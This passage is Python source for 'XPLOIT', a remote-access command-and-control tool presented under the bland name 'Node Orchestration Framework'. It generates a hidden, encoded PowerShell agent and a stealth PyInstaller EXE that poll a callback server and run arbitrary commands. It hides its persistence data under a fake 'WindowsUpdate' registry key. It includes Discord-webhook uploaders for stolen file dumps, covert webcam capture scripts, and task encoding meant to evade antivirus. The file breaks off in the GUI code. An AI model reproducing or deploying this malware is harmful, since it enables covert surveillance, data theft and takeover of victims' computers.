#!/usr/bin/env python3
"""
Distributed Node Orchestration Framework — main.py  (v8 — session multiplexing)

PS-template rules (do NOT break these):
  - No backtick-continuation across lines; all Invoke-WebRequest on ONE line.
  - LHOST/LPORT must be read inside each command handler (not at module level)
    so the correct values are used after the user enters them at startup.
  - PATH_SEP is injected by the AGENT exactly once per response.
"""

import os, sys, time, base64, socket, threading, shutil, queue
from dataclasses import dataclass
from typing import Optional
try:
    import tkinter as tk
    from tkinter import messagebox, simpledialog
    _TK_AVAILABLE = True
except ImportError:
    _TK_AVAILABLE = False
import uvicorn
from fastapi import FastAPI, UploadFile, File, Request, Response

app = FastAPI()

# ── Session data model ────────────────────────────────────────────────────────
@dataclass
class Session:
    session_id:   str
    ip:           str
    hostname:     str
    username:     str
    cwd:          str
    created_at:   str
    status:       str = "Running"   # "Running" | "Stopped"
    current_task: str = ""
    task_result:  Optional[str] = None
    last_seen:    float = 0.0       # epoch seconds — updated on every /get_task poll


class SessionManager:
    def __init__(self):
        self._lock    = threading.Lock()
        self._store:  dict[str, Session] = {}
        self._count   = 0

    def _next_id(self) -> str:
        self._count += 1
        return f"SES-{self._count:03d}"

    def register(self, ip: str, hostname: str, username: str, cwd: str,
                  machine_uid: str = "") -> Session:
        """Create a new session, or refresh an existing one.
        Dedup key: machine_uid (a persistent UUID the agent generates and stores in
        the registry).  Falls back to hostname+username only when uid is absent so
        old payloads still work.  This guarantees two different machines with the same
        username never share a session."""
        with self._lock:
            key = machine_uid if machine_uid else f"{hostname}|{username}"
            existing = self._store.get(key)   # keyed by uid/fallback key
            if existing:
                existing.ip          = ip
                existing.cwd         = cwd
                existing.status      = "Running"
                # Reset last_seen so wait_for_result doesn’t immediately
                # trigger the offline guard using the stale pre-reboot timestamp.
                existing.last_seen    = 0.0
                # Clear any stale pending task so a concurrent old agent can’t steal it.
                existing.current_task = ""
                existing.task_result  = None
                return existing
            sid = self._next_id()
            ts  = time.strftime("%Y-%m-%d %H:%M:%S")
            s   = Session(session_id=sid, ip=ip, hostname=hostname,
                          username=username, cwd=cwd, created_at=ts)
            self._store[sid] = s          # lookup by session_id (for _send / connect)
            self._store[key] = s          # lookup by uid/fallback key (for dedup)
            return s

    def get(self, sid: str) -> Optional[Session]:
        """Look up by session_id (used by connect, _send, /get_task, /submit_result)."""
        with self._lock:
            # Only return entries that are actual Session objects with matching session_id
            s = self._store.get(sid)
            if isinstance(s, Session) and s.session_id == sid:
                return s
            return None

    def get_by_hostname(self, hostname: str) -> Optional[Session]:
        """Fallback lookup by hostname (used when X-Session-ID header is absent)."""
        with self._lock:
            return next(
                (s for s in self._store.values()
                 if s.hostname == hostname and s.status == "Running"),
                None
            )

    def stop(self, sid: str) -> bool:
        with self._lock:
            s = self._store.get(sid)
            if isinstance(s, Session) and s.session_id == sid:
                s.status       = "Stopped"
                s.current_task = ""
                s.task_result  = None
                return True
            return False

    def kill_all(self) -> int:
        """Send Stop-Process to all Running agents and wipe the entire session store.
        Returns the number of sessions that were killed."""
        with self._lock:
            running = [s for s in self._store.values()
                       if isinstance(s, Session) and s.status == "Running"]
            for s in running:
                # Queue a kill task; the next /get_task poll will pick it up
                s.current_task = "Stop-Process -Id $PID -Force"
                s.task_result  = None
                s.status       = "Stopped"
            killed = len(running)
        # Give agents ~2 s to pick up the kill task before we wipe the store
        time.sleep(2.0 if killed else 0)
        with self._lock:
            self._store.clear()
            self._count = 0    # reset counter so next session starts at SES-001 again
        return killed

    def clear_all(self) -> int:
        """Wipe every session entry without sending kill signals (for dead/stale sessions)."""
        with self._lock:
            n = len({k for k, v in self._store.items()
                     if isinstance(v, Session) and v.session_id == k})
            self._store.clear()
            self._count = 0
        return n

    def list_all(self) -> list:
        with self._lock:
            return sorted(self._store.values(), key=lambda s: s.session_id)


# ── Global state ──────────────────────────────────────────────────────────────
SM:                SessionManager  = SessionManager()
ACTIVE_SESSION_ID: Optional[str]  = None
LHOST                             = "0.0.0.0"  # bind address — always all interfaces
CALLBACK_HOST                     = "0.0.0.0"  # IP baked into payload (set at startup)
CALLBACK_URL                      = ""
LPORT                             = 8080
PATH_SEP                          = "---PATH_SEP---"
_uvicorn_server                   = None
_listener_thread: Optional[threading.Thread] = None   # stored so we can join() on shutdown
_GUI_INSTANCE                     = None               # set to XploitGUI instance in GUI mode


# ── Reusable PS function strings (no backticks, no dynamic values) ────────────

# Discord multipart uploader — call as: _DU '<webhook_url>' '<file_path>'
_DISCORD_UPLOAD = (
    "function _DU($whu,$file){"
    "$zb=[System.IO.File]::ReadAllBytes($file);"
    "$bn=[System.Guid]::NewGuid().ToString('N');"
    "$CR=[char]13+[char]10;"
    "$eu=[System.Text.Encoding]::UTF8;"
    "$tn=[System.IO.Path]::GetFileName($file);"
    "$mg='{\"content\":\"Dump from '+$env:COMPUTERNAME+'\"}';"
    "$pl=[System.Collections.Generic.List[byte[]]]::new();"
    "$pl.Add($eu.GetBytes('--'+$bn+$CR+'Content-Disposition: form-data; name=\"payload_json\"'+$CR+'Content-Type: application/json'+$CR+$CR+$mg+$CR));"
    "$pl.Add($eu.GetBytes('--'+$bn+$CR+'Content-Disposition: form-data; name=\"file\"; filename=\"'+$tn+'\"'+$CR+'Content-Type: application/octet-stream'+$CR+$CR));"
    "$pl.Add($zb);$pl.Add($eu.GetBytes($CR+'--'+$bn+'--'+$CR));"
    "$tot=0;foreach($p in $pl){$tot+=$p.Length};"
    "$body=New-Object byte[] $tot;$pos=0;"
    "foreach($p in $pl){[System.Buffer]::BlockCopy($p,0,$body,$pos,$p.Length);$pos+=$p.Length};"
    "$wc=New-Object System.Net.WebClient;"
    "$wc.Headers.Add('Content-Type','multipart/form-data; boundary='+$bn);"
    "try{$wc.UploadData($whu,'POST',$body)|Out-Null}finally{$wc.Dispose()}"
    "};"
)

# Discord chunked text sender — call as: _DS '<webhook_url>' $msg
_DISCORD_TEXT = (
    "function _DS($whu,$msg){"
    "$cs=1900;$i=0;"
    "$wc=New-Object System.Net.WebClient;"
    "$wc.Headers.Add('Content-Type','application/json; charset=utf-8');"
    "$wc.Encoding=[System.Text.Encoding]::UTF8;"
    "while($i -lt $msg.Length){"
    "$chunk=$msg.Substring($i,[Math]::Min($cs,$msg.Length-$i));"
    "$pl=ConvertTo-Json @{content=$chunk} -Compress;"
    "$wc.UploadString($whu,'POST',$pl);$i+=$cs;"
    "if($i -lt $msg.Length){Start-Sleep -Milliseconds 800}"
    "};$wc.Dispose()};"
)

# Livecam child-process script (STA WinForms + avicap32).
_LC_SRC = (
    "param([string]$avi,[string]$flag)\n"
    "Add-Type -AssemblyName System.Windows.Forms\n"
    "Add-Type -TypeDefinition @'\n"
    "using System;using System.Runtime.InteropServices;using System.Windows.Forms;\n"
    "public class CamF:Form{\n"
    "[DllImport(\"avicap32.dll\")]public static extern IntPtr capCreateCaptureWindowA(string n,int s,int x,int y,int w,int h,IntPtr p,int id);\n"
    "[DllImport(\"user32.dll\")]public static extern IntPtr SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);\n"
    "[DllImport(\"user32.dll\",EntryPoint=\"SendMessageA\",CharSet=CharSet.Ansi)]public static extern IntPtr SendMessageS(IntPtr h,uint m,IntPtr w,string l);\n"
    "[DllImport(\"user32.dll\")]public static extern bool DestroyWindow(IntPtr h);\n"
    "const uint CC=0x040A;const uint CD=0x040B;const uint CF=0x0414;const uint CS=0x043E;const uint CX=0x0444;\n"
    "public string Avi,Flag;IntPtr cap;\n"
    "protected override void OnLoad(EventArgs e){\n"
    "base.OnLoad(e);Opacity=0;ShowInTaskbar=false;\n"
    "cap=capCreateCaptureWindowA(\"c\",0x40000000,-640,-480,320,240,Handle,0);\n"
    "if(cap==IntPtr.Zero){Close();return;}\n"
    "SendMessage(cap,CC,(IntPtr)0,IntPtr.Zero);\n"
    "SendMessageS(cap,CF,IntPtr.Zero,Avi);\n"
    "SendMessage(cap,CS,IntPtr.Zero,IntPtr.Zero);\n"
    "var t=new System.Windows.Forms.Timer();t.Interval=500;\n"
    "t.Tick+=(s2,e2)=>{\n"
    "if(System.IO.File.Exists(Flag)){\n"
    "t.Stop();\n"
    "SendMessage(cap,CX,IntPtr.Zero,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(3000);\n"
    "SendMessage(cap,CD,IntPtr.Zero,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(500);\n"
    "DestroyWindow(cap);\n"
    "Close();\n"
    "}};t.Start();}\n"
    "}\n"
    "'@ -ReferencedAssemblies 'System.Windows.Forms'\n"
    "$f=New-Object CamF;$f.Avi=$avi;$f.Flag=$flag\n"
    "[System.Windows.Forms.Application]::Run($f)\n"
)
_LC_B64 = base64.b64encode(_LC_SRC.encode('utf-16-le')).decode()

# Webcam single-frame capture child script (STA + avicap32 + SendMessage)
_PIC_SRC = (
    "param([string]$bmp,[string]$done)\n"
    "Add-Type -AssemblyName System.Windows.Forms\n"
    "Add-Type -TypeDefinition @'\n"
    "using System;using System.Runtime.InteropServices;using System.Windows.Forms;\n"
    "public class PicCap:Form{\n"
    "[DllImport(\"avicap32.dll\")]public static extern IntPtr capCreateCaptureWindowA(string n,int s,int x,int y,int w,int h,IntPtr p,int id);\n"
    "[DllImport(\"user32.dll\")]public static extern IntPtr SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);\n"
    "[DllImport(\"user32.dll\",EntryPoint=\"SendMessageA\",CharSet=CharSet.Ansi)]public static extern IntPtr SendMessageS(IntPtr h,uint m,IntPtr w,string l);\n"
    "[DllImport(\"user32.dll\")]public static extern bool DestroyWindow(IntPtr h);\n"
    "const uint CC=0x040A;const uint CD=0x040B;const uint GF=0x043C;const uint SD=0x0419;\n"
    "public string Bmp,Done;IntPtr cap;\n"
    "protected override void OnLoad(EventArgs e){\n"
    "base.OnLoad(e);Opacity=0;ShowInTaskbar=false;\n"
    "cap=capCreateCaptureWindowA(\"p\",0x40000000,-640,-480,320,240,Handle,0);\n"
    "if(cap==IntPtr.Zero){System.IO.File.WriteAllText(Done,\"err\");Close();return;}\n"
    "SendMessage(cap,CC,(IntPtr)0,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(2000);\n"
    "SendMessage(cap,GF,IntPtr.Zero,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(500);\n"
    "SendMessage(cap,GF,IntPtr.Zero,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(500);\n"
    "SendMessageS(cap,SD,IntPtr.Zero,Bmp);\n"
    "System.Threading.Thread.Sleep(500);\n"
    "SendMessage(cap,CD,IntPtr.Zero,IntPtr.Zero);\n"
    "DestroyWindow(cap);\n"
    "System.IO.File.WriteAllText(Done,\"ok\");\n"
    "Close();}\n"
    "}\n"
    "'@ -ReferencedAssemblies 'System.Windows.Forms'\n"
    "$f=New-Object PicCap;$f.Bmp=$bmp;$f.Done=$done\n"
    "[System.Windows.Forms.Application]::Run($f)\n"
)
_PIC_B64 = base64.b64encode(_PIC_SRC.encode('utf-16-le')).decode()


# ── Payload generator ─────────────────────────────────────────────────────────
def generate_ps_payload(url: str) -> str:
    """
    Compact single-string PS agent — no backtick line-continuation.
    Now captures X-Session-ID from the check-in response and sends it
    on all subsequent requests so the server can route tasks correctly.
    Falls back to IP-based routing if header is absent (old-server compat).

    The callback URL is read from HKCU:\\SOFTWARE\\WindowsUpdate\\cb at startup
    so that persistence survives ngrok URL rotations — just update the registry
    key with persist-update-url and the agent will pick it up on next reboot.
    The `url` argument is only used as the initial/fallback value.
    """
    ps = (
        f"$currentPath=$PWD.Path;"
        # ── Registry bootstrap ───────────────────────────────────────────────────
        # Always create the key if absent, generate a stable machine UID, and
        # ALWAYS write the baked-in callback URL so a stale old ngrok URL stored
        # from a previous session can never hijack a fresh payload run.
        "$rp='HKCU:\\SOFTWARE\\WindowsUpdate';"
        "if(-not(Test-Path $rp)){New-Item $rp -Force|Out-Null};"
        "$uid=(Get-ItemProperty $rp -Name uid -EA 0).uid;"
        "if(-not $uid){$uid=[System.Guid]::NewGuid().ToString();"
        "Set-ItemProperty $rp -Name uid -Value $uid};"
        # Write baked URL unconditionally — overwrites any stale value.
        # (persist-update-url can overwrite this again while the agent is running.)
        f"$cbUrl='{url}';"
        f"Set-ItemProperty $rp -Name cb -Value $cbUrl;"
        # Build the checkin body once (uid never changes per machine).
        f"$info=\"$uid|$env:COMPUTERNAME|\"+$env:USERNAME+\"|$currentPath\";"
        f"$sid='';"
        # ── Main agent loop ──────────────────────────────────────────────────────
        # Checkin is INSIDE the loop: if the network is not ready at login the
        # agent retries every 3 s automatically until the server responds with a
        # Session-ID, then switches to normal task-polling.
        f"while($true){{"
        f"try{{"
        # Re-read cb URL every iteration so persist-update-url takes effect live.
        f"$cbUrl=(Get-ItemProperty $rp -Name cb -EA 0).cb;if(-not $cbUrl){{$cbUrl='{url}'}};"
        # If we don't have a session ID yet, attempt checkin first.
        f"if(-not $sid){{"
        f"$b64c=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($info));"
        f"$gH=@{{\"ngrok-skip-browser-warning\"=\"true\"}};"
        f"$cr=Invoke-WebRequest -Uri \"$cbUrl/checkin\" -Method Post -Body $b64c -ContentType 'text/plain' -Headers $gH -UseBasicParsing;"
        f"if($cr.Headers['X-Session-ID']){{$sid=$cr.Headers['X-Session-ID']}}"
        f"}};"
        # Only poll for tasks once we have a valid session ID.
        f"if($sid){{"
        f"$h=@{{\"X-Agent-CWD\"=$currentPath;\"X-Session-ID\"=$sid;\"ngrok-skip-browser-warning\"='true'}};"
        f"$r=Invoke-WebRequest -Uri \"$cbUrl/get_task\" -Headers $h -UseBasicParsing;"
        f"$cmd=$r.Content.Trim();"
        f"if($cmd){{"
        f"$out=\"\";"
        f"if($cmd -match '^cd(\\s|$)'){{"
        f"$tgt=($cmd -replace '^cd\\s*','').Trim();"
        f"if($tgt -eq '' -or $tgt -eq '~'){{$tgt=$HOME}}"
        f"elseif(-not [System.IO.Path]::IsPathRooted($tgt)){{$tgt=Join-Path $currentPath $tgt}};"
        f"$tgt=$tgt.Replace('/','\\\\');"
        f"try{{Set-Location -LiteralPath $tgt;$currentPath=(Get-Location).Path;$out=\"[+] $currentPath\"}}catch{{$out=\"[-] cd failed: $_\"}}"
        f"}}else{{"
        f"Set-Location $currentPath;"
        f"try{{$out=Invoke-Expression $cmd 2>&1|Out-String;if(-not $out.Trim()){{$out='(no output)'}}}}catch{{$out=\"ERROR: $_\"}};"
        f"$currentPath=(Get-Location).Path"
        f"}};"
        f"$b64r=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($out+'{PATH_SEP}'+$currentPath));"
        f"$sh=@{{\"X-Session-ID\"=$sid;\"ngrok-skip-browser-warning\"='true'}};"
        f"Invoke-WebRequest -Uri \"$cbUrl/submit_result\" -Method Post -Body $b64r -ContentType 'text/plain' -Headers $sh -UseBasicParsing|Out-Null"
        f"}}"          # closes if($cmd)
        f"}}"          # closes if($sid)
        f"}}catch{{}};"   # closes try{} — exactly ONE }} = one }, then catch{};
        f"Start-Sleep -Seconds 3"
        f"}}"          # closes while($true)
    )
    enc = base64.b64encode(ps.encode('utf-16le')).decode()
    return f"powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Enc {enc}"


# ── EXE payload generator ─────────────────────────────────────────────────────
# Python agent source compiled by PyInstaller into a stealth EXE.
# Uses <<<CALLBACK_URL>>> as a substitution placeholder.
_AGENT_PY_SRC = r"""
import os, sys, base64, time, subprocess, socket, getpass
from urllib.request import urlopen, Request
from urllib.error import URLError

CALLBACK_URL = "<<<CALLBACK_URL>>>"
_PATH_SEP    = "---PATH_SEP---"

try:
    import winreg as _wr
    def _reg_get(name):
        try:
            k = _wr.OpenKey(_wr.HKEY_CURRENT_USER, r"SOFTWARE\WindowsUpdate")
            v, _ = _wr.QueryValueEx(k, name); _wr.CloseKey(k); return v
        except: return None
    def _reg_set(name, val):
        try:
            k = _wr.CreateKey(_wr.HKEY_CURRENT_USER, r"SOFTWARE\WindowsUpdate")
            _wr.SetValueEx(k, name, 0, _wr.REG_SZ, val); _wr.CloseKey(k)
        except: pass
except ImportError:
    def _reg_get(name): return None
    def _reg_set(name, val): pass

def _get_uid():
    uid = _reg_get("uid")
    if not uid:
        import uuid; uid = str(uuid.uuid4()); _reg_set("uid", uid)
    return uid

def _exec(cmd, cwd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=120, cwd=cwd)
        out = r.stdout + r.stderr
        return out if out.strip() else "(no output)"
    except Exception as e: return f"ERROR: {e}"

def _post(url, data, hdrs=None):
    hdrs = hdrs or {}
    req = Request(url,
                  data=data if isinstance(data, bytes) else data.encode(),
                  headers=hdrs, method="POST")
    with urlopen(req, timeout=10) as r:
        return r.read().decode(), dict(r.headers)

def _get(url, hdrs=None):
    hdrs = hdrs or {}
    req = Request(url, headers=hdrs)
    with urlopen(req, timeout=10) as r:
        return r.read().decode(), dict(r.headers)

def main():
    uid      = _get_uid()
    _reg_set("cb", CALLBACK_URL)
    hostname = socket.gethostname()
    username = getpass.getuser()
    cwd      = os.getcwd()
    info     = f"{uid}|{hostname}|{username}|{cwd}"
    sid      = ""
    while True:
        try:
            cb = _reg_get("cb") or CALLBACK_URL
            if not sid:
                b64i = base64.b64encode(info.encode()).decode()
                _, hdrs_r = _post(
                    f"{cb}/checkin", b64i,
                    {"Content-Type": "text/plain",
                     "ngrok-skip-browser-warning": "true"})
                sid = hdrs_r.get("X-Session-ID",
                                 hdrs_r.get("x-session-id", ""))
            if sid:
                task, _ = _get(
                    f"{cb}/get_task",
                    {"X-Session-ID": sid, "X-Agent-CWD": cwd,
                     "ngrok-skip-browser-warning": "true"})
                task = task.strip()
                if task:
                    if task.lower().startswith("cd"):
                        tgt = task[2:].strip() or os.path.expanduser("~")
                        if not os.path.isabs(tgt): tgt = os.path.join(cwd, tgt)
                        tgt = tgt.replace("/", os.sep)
                        try:
                            os.chdir(tgt); cwd = os.getcwd()
                            out = f"[+] {cwd}"
                        except Exception as e: out = f"[-] cd failed: {e}"
                    else:
                        out = _exec(task, cwd)
                        try: cwd = os.getcwd()
                        except: pass
                    payload = base64.b64encode(
                        (out + _PATH_SEP + cwd).encode()).decode()
                    _post(f"{cb}/submit_result", payload,
                          {"X-Session-ID": sid,
                           "Content-Type": "text/plain",
                           "ngrok-skip-browser-warning": "true"})
        except: pass
        time.sleep(3)

if __name__ == "__main__":
    main()
"""


def generate_exe_payload(url: str) -> str:
    """
    Build agent delivery files in ./agent_output/:
      1. agent.bat       — .bat wrapper that runs the PS payload on the target
      2. _agent_src.py   — standalone Python agent (same HTTP protocol)
      3. agent.exe       — compiled stealth EXE (requires PyInstaller)
    Falls back gracefully if PyInstaller is not installed.
    Returns a human-readable status summary.
    """
    out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "agent_output")
    os.makedirs(out_dir, exist_ok=True)

    # 1. BAT launcher — wraps the encoded PS payload for easy deployment
    payload_cmd = generate_ps_payload(url)
    bat_path    = os.path.join(out_dir, "agent.bat")
    with open(bat_path, "w") as fh:
        fh.write(f"@echo off\n{payload_cmd}\n")

    # 2. Python agent source
    py_src  = _AGENT_PY_SRC.replace("<<<CALLBACK_URL>>>", url)
    py_path = os.path.join(out_dir, "_agent_src.py")
    with open(py_path, "w", encoding="utf-8") as fh:
        fh.write(py_src)

    # 3. Try PyInstaller compilation
    exe_path  = os.path.join(out_dir, "agent.exe")
    exe_built = False
    try:
        import PyInstaller.__main__ as _pyi
        build_tmp = os.path.join(out_dir, "_build")
        _pyi.run([
            py_path,
            "--onefile", "--noconsole",
            "--distpath", out_dir,
            "--workpath", build_tmp,
            "--specpath", build_tmp,
            "--name", "agent",
            "--clean", "-y",
        ])
        if os.path.isdir(build_tmp):
            shutil.rmtree(build_tmp, ignore_errors=True)
        exe_built = os.path.isfile(exe_path)
    except (ImportError, SystemExit, Exception):
        exe_built = False

    lines = [f"[+] Agent files saved to: {out_dir}"]
    lines.append(f"  \u2022 agent.bat     — BAT launcher (drop + run on Windows target)")
    if exe_built:
        lines.append(f"  \u2022 agent.exe     — Stealth EXE compiled by PyInstaller")
    else:
        lines.append(f"  \u2022 agent.exe     — NOT BUILT  (pip install pyinstaller)")
    return "\n".join(lines)




# ── Helpers ───────────────────────────────────────────────────────────────────
def parse_agent_response(raw: str):
    if PATH_SEP in raw:
        idx = raw.index(PATH_SEP)
        out = raw[:idx].strip()
        rem = raw[idx + len(PATH_SEP):].strip()
        cwd = next((l.strip() for l in rem.splitlines() if l.strip()), None)
        return out, cwd
    return raw.strip(), None


def _active_session() -> Optional[Session]:
    """Return the currently active Session object, or None."""
    if ACTIVE_SESSION_ID is None:
        return None
    return SM.get(ACTIVE_SESSION_ID)


def wait_for_result(session: Session, timeout: float = 120.0) -> str:
    """Block until the agent posts a result, the session stops, or we time out.
    Also detects when the agent goes offline mid-wait (no poll for >12 s)."""
    dl = time.time() + timeout
    OFFLINE_THRESH = 12.0   # agent polls every 3 s; 4 missed polls = offline
    while session.task_result is None:
        if time.time() > dl:
            session.current_task = ""   # discard stale task
            return "[!] Timeout — no agent response."
        if session.status == "Stopped":
            return "[!] Session was stopped."
        # If agent was ever seen before, check for recent heartbeat
        if session.last_seen > 0 and (time.time() - session.last_seen) > OFFLINE_THRESH:
            session.current_task = ""   # discard stale task so it doesn't run on reconnect
            session.task_result  = None
            return "[!] Agent went offline (no heartbeat). Wait for it to reconnect and retry."
        time.sleep(0.3)
    r = session.task_result or "(no output)"
    session.task_result = None
    return r


def _send(ps: str, timeout: float = 60.0) -> str:
    """Queue a raw PS string to the active session and block until agent replies."""
    s = _active_session()
    if s is None:
        return "[!] No active session."
    s.current_task = ps
    s.task_result  = None
    return wait_for_result(s, timeout)


def _send_encoded(ps: str, timeout: float = 60.0) -> str:
    """Base64-encode ps before queuing so AV string signatures can't match it."""
    s = _active_session()
    if s is None:
        return "[!] No active session."
    b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
    wrapper = (
        f"[System.Text.Encoding]::Unicode.GetString("
        f"[Convert]::FromBase64String('{b64}'))|Invoke-Expression"
    )
    s.current_task = wrapper
    s.task_result  = None
    return wait_for_result(s, timeout)


def _ask_webhook() -> Optional[str]:
    whu = input("[?] Discord webhook URL: ").strip()
    if not whu.startswith("https://discord.com/api/webhooks/"):
        print("[-] Invalid webhook URL.")
        return None
    return whu


# ── GUI Mode ─────────────────────────────────────────────────────────────────
class XploitGUI:
    """
    Premium dark-themed Tkinter GUI replicating every CLI command as a UI
    control.  Runs the same FastAPI listener and shared SessionManager as
    CLI mode.  All blocking operations run in daemon threads; results are
    piped via queue.Queue into the terminal widget using root.after() polling.
    """

    # ── Palette (mirrors CLI ANSI theme) ──────────────────────────────────────
    BG      = "#0d0d0d"
    PANEL   = "#101018"
    SIDEBAR = "#0c0c14"
    ACCENT  = "#7b2fff"
    CYAN    = "#00e5ff"
    GREEN   = "#00ff87"
    RED     = "#ff2244"
    ORANGE  = "#ff8c00"
    YELLOW  = "#ffd700"
    TEXT    = "#d0d0e8"
    DIM     = "#44445a"
    BTN_BG  = "#16162a"
    BTN_HOV = "#22224a"
    TERM_BG = "#07070f"
    TERM_FG = "#00ff41"

    def __init__(self, callback_url: str):
        if not _TK_AVAILABLE:
            print("[-] tkinter unavailable — cannot launch GUI mode.")
            return
        self.callback_url        = callback_url
        self._q: queue.Queue    = queue.Queue()
        self._selected_sid: Optional[str] = None
        self._session_cache: list         = []
        self._cmd_history: list           = []
        self._hist_idx: int               = -1
        self.root = tk.Tk()
        self._build_ui()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    def run(self):
        global _GUI_INSTANCE
        _GUI_INSTANCE = self
        self._schedule_refresh()
        self._schedule_poll()
        self.log_sys(f"[*] Xploit GUI started — listener on 0.0.0.0:{LPORT}")
        self.log_sys(f"[*] Callback URL : {self.callback_url}")
        self.log_sys("[*] Waiting for agent check-ins...\n")
        self.root.mainloop()

    # ── Thread-safe logging ───────────────────────────────────────────────────
    def log(self, text: str):     self._q.put(("out", str(text)))
    def log_sys(self, text: str): self._q.put(("sys", str(text)))
    def log_err(self, text: str): self._q.put(("err", str(text)))

    def notify_checkin(self, session: Session):
        """Called from the FastAPI thread — schedule a GUI update via after_idle."""
        def _upd():
            self._refresh_sessions()
            self.log_sys(
                f"[+] Check-in  : {session.session_id} | "
                f"{session.hostname} ({session.username}) @ {session.ip}")
            self.log_sys(f"    CWD       : {session.cwd}\n")
        self.root.after_idle(_upd)

    def notify_upload(self, name: str, dest: str):
        """Called from the FastAPI /upload route."""
        self.root.after_idle(
            lambda: self.log_sys(f"[!] File received : {name}  \u2192  {dest}\n"))

    def _schedule_poll(self):
        try:
            while True:
                kind, text = self._q.get_nowait()
                self._write_terminal(text, kind)
        except queue.Empty:
            pass
        self.root.after(100, self._schedule_poll)

    def _write_terminal(self, text: str, kind: str = "out"):
        tag = kind if kind in ("out", "sys", "err") else "out"
        self._term.config(state=tk.NORMAL)
        self._term.insert(tk.END, text + "\n", tag)
        self._term.see(tk.END)
        self._term.config(state=tk.DISABLED)

    # ── UI construction ────────────────────────────────────────────────────
    def _build_ui(self):
        self.root.title("XPLOIT — Node Orchestration Framework")
        self.root.configure(bg=self.BG)
        self.root.geometry("1320x840")
        self.root.minsize(1100, 720)
        self._build_titlebar()
        self._build_body()
        self._build_toolbar()

    def _build_titlebar(self):
        bar = tk.Frame(self.root, bg="#1a003f", height=50)
        bar.pack(fill=tk.X, side=tk.TOP)
        bar.pack_propagate(False)
        tk.Label(bar, text="\u26a1 XPLOIT", bg="#1a003f", fg=self.CYAN,
                 font=("Consolas", 16, "bold"), padx=14).pack(side=tk.LEFT, fill=tk.Y)
        tk.Label(bar, text="Distributed Node Orchestration Framework",
                 bg="#1a003f", fg="#8855ff",
                 font=("Segoe UI", 11)).pack(side=tk.LEFT, fill=tk.Y)
        tk.Label(bar, text=f"C2: {self.callback_url}   port:{LPORT}",
                 bg="#1a003f", fg="#556688",
                 font=("Consolas", 9), padx=16).pack(side=tk.RIGHT, fill=tk.Y)

    def _build_body(self):
        body = tk.Frame(self.root, bg=self.BG)
        body.pack(fill=tk.BOTH, expand=True)
        self._build_sidebar(body)
        self._build_right(body)

    def _build_sidebar(self, parent):
        sb = tk.Frame(parent, bg=self.SIDEBAR, width=238)
        sb.pack(fill=tk.Y, side=tk.LEFT, padx=(4, 2), pady=4)
        sb.pack_propagate(False)
        tk.Label(sb, text="\u25c8  SESSIONS", bg=self.SIDEBAR, fg=self.CYAN,
                 font=("Consolas", 11, "bold"),
                 anchor=tk.W, padx=10, pady=8).pack(fill=tk.X)
        tk.Frame(sb, bg=self.ACCENT, height=1).pack(fill=tk.X)
        # Listbox
        lf  = tk.Frame(sb, bg=self.SIDEBAR)
        lf.pack(fill=tk.BOTH, expand=True, padx=5, pady=6)
        vsb = tk.Scrollbar(lf, bg=self.PANEL, troughcolor=self.BG, width=10)
        self._sess_lb = tk.Listbox(
            lf, yscrollcommand=vsb.set,
            bg="#08080f", fg=self.GREEN,
            selectbackground="#3a1a7a", selectforeground="#ffffff",
            font=("Consolas", 9), borderwidth=0,
            highlightthickness=1, highlightcolor=self.ACCENT,
            highlightbackground=self.DIM, activestyle="none", relief=tk.FLAT)
        vsb.config(command=self._sess_lb.yview)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self._sess_lb.pack(fill=tk.BOTH, expand=True)
        self._sess_lb.bind("<<ListboxSelect>>", self._on_sess_select)
        self._sess_lb.bind("<Double-Button-1>", lambda e: self._connect_session())
        self._sess_status = tk.Label(
            sb, text="No session selected",
            bg=self.SIDEBAR, fg=self.DIM, font=("Segoe UI", 8), pady=3)
        self._sess_status.pack()
        tk.Frame(sb, bg=self.DIM, height=1).pack(fill=tk.X, padx=8, pady=2)
        for label, cmd, fg in [
            ("  \u27f3  Refresh",       self._refresh_sessions, self.CYAN),
            ("  \u25b6  Connect",        self._connect_session,  self.GREEN),
            ("  \u23f8  Detach",         self._detach_session,   self.YELLOW),
            ("  \u25a0  Stop Session",   self._stop_session,     self.ORANGE),
            ("  \u2716  Kill All",       self._kill_all,          self.RED),
            ("  \u2b21  Clear Stopped",  self._clear_sessions,   self.DIM),
        ]:
            self._sb_btn(sb, label, cmd, fg)

    def _sb_btn(self, parent, text, cmd, fg):
        b = tk.Button(parent, text=text, command=cmd,
                      bg=self.BTN_BG, fg=fg, activebackground=self.BTN_HOV,
                      activeforeground=fg, relief=tk.FLAT,
                      font=("Segoe UI", 9, "bold"), cursor="hand2",
                      padx=6, pady=6, anchor=tk.W, bd=0)
        b.pack(fill=tk.X, padx=6, pady=2)

    def _build_right(self, parent):
        right = tk.Frame(parent, bg=self.BG)
        right.pack(fill=tk.BOTH, expand=True, side=tk.LEFT, padx=(0, 4), pady=4)
        self._build_terminal(right)
        self._build_cmdbar(right)

    def _build_terminal(self, parent):
        frame = tk.Frame(parent, bg=self.PANEL,
                         highlightbackground=self.ACCENT, highlightthickness=1)
        frame.pack(fill=tk.BOTH, expand=True, pady=(0, 3))
        hdr = tk.Frame(frame, bg="#0a0a1a", height=22)
        hdr.pack(fill=tk.X)
        hdr.pack_propagate(False)
        tk.Label(hdr, text="  \u25c9  TERMINAL OUTPUT", bg="#0a0a1a",
                 fg=self.DIM, font=("Segoe UI", 8, "bold")).pack(side=tk.LEFT, fill=tk.Y)
        vsb = tk.Scrollbar(frame, bg=self.PANEL, troughcolor=self.BG, width=10)
        self._term = tk.Text(
            frame, yscrollcommand=vsb.set,
            bg=self.TERM_BG, fg=self.TERM_FG,
            font=("Consolas", 10), wrap=tk.WORD,
            state=tk.DISABLED, relief=tk.FLAT,
            cursor="arrow", padx=10, pady=6,
